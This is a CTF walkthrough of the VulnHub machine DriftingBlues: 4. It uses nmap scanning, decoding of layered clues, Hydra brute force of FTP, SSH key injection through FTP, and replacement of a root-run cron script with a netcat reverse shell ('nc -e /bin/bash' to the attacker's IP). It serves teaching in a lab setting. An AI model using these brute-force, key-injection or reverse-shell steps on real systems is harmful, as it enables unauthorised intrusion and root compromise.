---
title: "DriftingBlues: 4"
date: 07-26-2024
excerpt: VulnHub
cover: ../uploads/cover_driftingblues4.jpg
tags: bruteforce, crontab privesc
---

Welcome back!! In this post, I’ll walk you through how I rooted the fourth box in the **DriftingBlues** series. This boot2root challenge was a great mix of enumeration, exploitation, and privilege escalation — and I’ll be sharing each step I took, from initial foothold all the way to gaining root access. Let's start!

As usual, we’ll kick things off with an `Nmap` scan to identify open ports that might serve as our initial entry point into the system.

```bash
nmap -A -sC -p- -T5 -oN nmap_result.log 192.168.137.55
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FigS2JLmg4bQiBXmfM8cl%252FScreenshot%2520%281623%29.png%3Falt%3Dmedia%26token%3Dd0909178-16b2-4ae2-a2c0-7c3b897668d5&width=768&dpr=3&quality=100&sign=6f1a473&sv=2)

Port 21 (FTP), Port 22 (SSH), and Port 80 (HTTP) are open

Unfortunately, anonymous login is not permitted on the FTP server.

Let's visit the webpage.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FaAXLJROL4aamSHgxec9L%252FScreenshot%2520%281624%29.png%3Falt%3Dmedia%26token%3D22a7feec-a931-46ee-9925-1f20bbcbb7fe&width=768&dpr=3&quality=100&sign=c813b6c4&sv=2)

Nothing useful, let's check the source code.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FKbYsn3kIcmth5ZJslWrZ%252FScreenshot%2520%281625%29.png%3Falt%3Dmedia%26token%3D0aae611b-dd04-427e-8397-d3dac050af41&width=768&dpr=3&quality=100&sign=5fd9e2d7&sv=2)

There you are, we have a Base64 encoded string in the source code. Decode it and this is the plaintext.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fsl2tV99DzSZ6nkol4u7L%252FScreenshot%2520%281628%29.png%3Falt%3Dmedia%26token%3D9e383abd-a5fb-48ad-bed0-1b7215ea923c&width=768&dpr=3&quality=100&sign=a603b429&sv=2)

Another Base64, Let's decode it again.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FpH3lsZbVefmVDW1d5Iy9%252FScreenshot%2520%281629%29.png%3Falt%3Dmedia%26token%3Da3ec2eb3-90ee-4b18-974a-c8e27b64d76c&width=768&dpr=3&quality=100&sign=f42b9c06&sv=2)

Another Base64-,-

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FEcaADBS6Ly01bKhiJta4%252FScreenshot%2520%281630%29.png%3Falt%3Dmedia%26token%3D2249755a-18b8-404b-b173-b407bf0afaf5&width=768&dpr=3&quality=100&sign=1e6a2ce3&sv=2)

Another one??? Boring...

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FLVZLekd53rfIbzzfdShs%252FScreenshot%2520%281631%29.png%3Falt%3Dmedia%26token%3Ddea3d5b4-c496-4ec4-8886-6c8bc91c1070&width=768&dpr=3&quality=100&sign=cf4bd59f&sv=2)

At last, I really thought I’d get the root password after going through those four layers of Base64 decoding. XD

Let's visit the file.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FJtR7Pojam2bmH6NvCDpM%252FScreenshot%2520%281632%29.png%3Falt%3Dmedia%26token%3Dc1dd44f9-d47c-4026-896b-c6355e708c47&width=768&dpr=3&quality=100&sign=5c0df549&sv=2)

A Brainf\*ck script — I've dealt with plenty of these before, haha. Let’s go ahead and execute it to reveal the plaintext.

The plaintext is a lot of hashes (#) and at the very bottom, there's a `.png` file path.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FV5h5IYpAthRjzVLPZKTe%252FScreenshot%2520%281633%29.png%3Falt%3Dmedia%26token%3Dce286f21-23e0-430a-923f-18095b688ca1&width=768&dpr=3&quality=100&sign=6aa58283&sv=2)

Let's visit it.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FcuvePoBIaCZfEBQESnr5%252FScreenshot%2520%281635%29.png%3Falt%3Dmedia%26token%3D6f84c407-b13a-4a62-97d0-51bb6cebd100&width=768&dpr=3&quality=100&sign=42d62846&sv=2)

We’ve got a QR code here. Instead of scanning it manually, we’ll extract its content using `zbarimg`.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fr9YC4klgHJVFL6ZGGWW3%252FScreenshot%2520%281636%29.png%3Falt%3Dmedia%26token%3D3ec5752a-b3cf-41a3-9e4f-7ebedf9d2b90&width=768&dpr=3&quality=100&sign=921e029&sv=2)

A link for another `.png` file. Let's visit it.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F6IfPF4ccst6r8fNUQtV4%252FScreenshot%2520%281637%29.png%3Falt%3Dmedia%26token%3Dc1184280-896c-4f8c-ab40-7002a62b2400&width=768&dpr=3&quality=100&sign=e83ea75a&sv=2)

We’ve got a list of names — could one of these be a potential username? Since the FTP port is open, it’s worth trying them out as possible login credentials.

I gathered all the names and saved them into a file called `user.txt`. Now, we'll use Hydra to brute-force the FTP login using this list with `rockyou.txt` .

```bash
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.137.55 ftp -t 40 -uVf
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FqswesJ7bf6PfLMAXr18z%252FScreenshot%2520%281639%29.png%3Falt%3Dmedia%26token%3D273573bf-5e53-49fd-9754-631f0d4a5fd3&width=768&dpr=3&quality=100&sign=c06e6e70&sv=2)

It took some time, but we finally got access to the FTP credentials. Let's login!

```bash
lftp -u hubert, john316 192.168.137.55
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F2T3yLxHxsdxSkgIoSb8E%252FScreenshot%2520%281645%29.png%3Falt%3Dmedia%26token%3D3333e8d3-bcf2-424f-b276-423642bb2d55&width=768&dpr=3&quality=100&sign=62c275c5&sv=2)

There’s a directory named `hubert`, which matches the username we logged in with. Let’s navigate into it and see what’s inside.

```bash
cd hubert
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Ft18cI6aS820P2SHA3Yh3%252FScreenshot%2520%281646%29.png%3Falt%3Dmedia%26token%3D99ba8776-eadc-456e-9dd9-ea0934286043&width=768&dpr=3&quality=100&sign=f4a5ba54&sv=2)

The directory is completely empty — there isn’t a single file inside.

Since we're logged in as the user `hubert`, we have ownership over their home directory — which means we can create and modify files within it. This opens up an opportunity: we can try to create a `.ssh` directory inside Hubert’s home folder, then upload our own **public key** as `authorized_keys`. If successful, this would allow us to authenticate via **SSH using our corresponding private key**, effectively granting us shell access as hubert without needing a password.

Let's make a `.ssh` directory.

`mkdir .ssh`

Then navigate to `.ssh` .

`cd .ssh`

Copy our public key and place it inside a file named `authorized_keys`.

Then put it in our target.

`put authorized_keys`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FOuxoSSdJBorWH6IG7reW%252FScreenshot%2520%281649%29.png%3Falt%3Dmedia%26token%3D2f9c2452-083f-4075-8b8b-67b4200f3e9c&width=768&dpr=3&quality=100&sign=4452f85f&sv=2)

Great! Our public key is now added to Hubert’s account — let’s attempt to login via SSH using our private key.

```bash
ssh hubert@192.168.137.55 -i ~/.ssh/id_rsa
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FZ8iVe8fgRv8evRBRZZMK%252FScreenshot%2520%281650%29.png%3Falt%3Dmedia%26token%3D6c6c5177-9003-4ac3-907f-8c736a009c20&width=768&dpr=3&quality=100&sign=f27fb715&sv=2)

We're in!!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FFJ1hPb41WYm7dXXS6l4R%252FScreenshot%2520%281654%29.png%3Falt%3Dmedia%26token%3D435bdad2-1699-4029-94ba-d385ba05c056&width=768&dpr=3&quality=100&sign=1f8be296&sv=2)

Got the User Flag!

A Python file is also present alongside the `user.txt` file named `emergeny.py` .

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FaEN1iqnErITP4ngZRWd9%252FScreenshot%2520%281657%29.png%3Falt%3Dmedia%26token%3D825ba534-e17a-433c-bcf6-16778987ea4c&width=768&dpr=3&quality=100&sign=25bc3f7f&sv=2)

What’s most interesting is that `emergency.py` is owned by root, yet we still have permission to read and execute it.

Let me make this clear — a lot of people, especially those new to Linux, often get confused when they see a file that's owned by `root` but can still be read or executed by a regular user. The key thing to understand is that **ownership and permissions are two separate concepts** in Linux. Just because a file is owned by `root` doesn’t mean it's completely off-limits. What matters is the **file's permission settings**, which determine who can read, write, or execute it. For example, in our case, `emergency.py` is owned by `root`, but it has permission bits that allow others to read and execute it — so we’re able to access it without needing root privileges.

Think of it like a house: **ownership** is like having your name on the title deed (that’s `root`), but **permissions** are like leaving the door unlocked or giving others a key. You may own the house, but if you leave it unlocked (world-readable/executable), others can still walk in or look around. So don’t assume ownership alone controls access — always check the permissions with `ls -l`. That’s how you avoid getting tripped up when assessing access on Linux systems.

Back to the challenge, let's check the file's content.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F1A7D27Zp9nsFZuOSxtU2%252FScreenshot%2520%281658%29.png%3Falt%3Dmedia%26token%3Dca8e0b87-d547-4f5d-8c57-d0f23b5aae46&width=768&dpr=3&quality=100&sign=a2d735a7&sv=2)

This code runs a system command that writes the value `1` into a file named `backdoor_testing` located in the `/tmp` directory. If the file doesn’t already exist, it will be created, and each time the code runs, another `1` gets added to the end of the file. It’s a basic way to log or mark something on the system using Python.

I had a strong suspicion that this code might be running on a schedule (cronjob), so I decided to run `pspy64` to monitor for any automated executions.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FP1ETZJ88ke5gYXYW5ohg%252FScreenshot%2520%281660%29.png%3Falt%3Dmedia%26token%3D4024887d-31c0-4ec6-864f-7ff31ad21c02&width=768&dpr=3&quality=100&sign=c8895933&sv=2)

As shown, the script is executed by root! We can exploit this by injecting a reverse shell payload to gain root access.

This is perfect, it has `netcat`!!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FybfynF61dgTN2qCyTtul%252FScreenshot%2520%281664%29.png%3Falt%3Dmedia%26token%3D9a10339e-7c7b-46f6-a657-a75763c17cb2&width=768&dpr=3&quality=100&sign=1870520f&sv=2)

Now let's modify the `emergency.py` .

We will remove the `emergency.py` and will make a modified one.

`rm emergency.py`

Now let's make a new one.

`nano emergency.py`

```python
#!/usr/bin/env python
import os

os.system('nc -e /bin/bash 192.168.137.246 1234')
```

Save it and make it executable.

`chmod +x emergency.py`

Now, let’s set up a listener on our attacking machine to catch the incoming reverse shell connection.

`nc -lnvp 1234`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fd4nlpr8GpITvCGPGO0iO%252FScreenshot%2520%281666%29.png%3Falt%3Dmedia%26token%3Df73ccbd5-da6b-4885-bcbd-fa058638e34e&width=768&dpr=3&quality=100&sign=802a5607&sv=2)

As you can see, our payload is executed successfully!

Now let's check out listener!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FK4LhnQ60Hjb5bMUiMFnn%252FScreenshot%2520%281665%29.png%3Falt%3Dmedia%26token%3Deb933de9-aa82-4ef4-949e-c41d10fc40ae&width=768&dpr=3&quality=100&sign=cd3aebfd&sv=2)

Yes! Now let’s upgrade the shell by spawning a proper TTY using `pty` .

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FUygQ6YU96jx2SeCVWOsL%252FScreenshot%2520%281667%29.png%3Falt%3Dmedia%26token%3Ddf36bcd5-72a1-4db4-81de-6c009c2750e0&width=768&dpr=3&quality=100&sign=59b790bb&sv=2)

We've successfully pwned DriftingBlues: 4!!

I forgot to grab a screenshot of the root flag, haha — but don’t worry, it’s the same format as the previous challenges.

This machine was relatively straightforward, making it a good challenge for beginners or those looking to sharpen their basic enumeration and privilege escalation skills. While it didn’t include overly complex techniques, it still required careful attention to detail and logical thinking — especially when spotting writable files executed by root and leveraging SSH key injection. Overall, it served as a solid reminder that even simple misconfigurations can lead to full system compromise when approached with the right mindset.
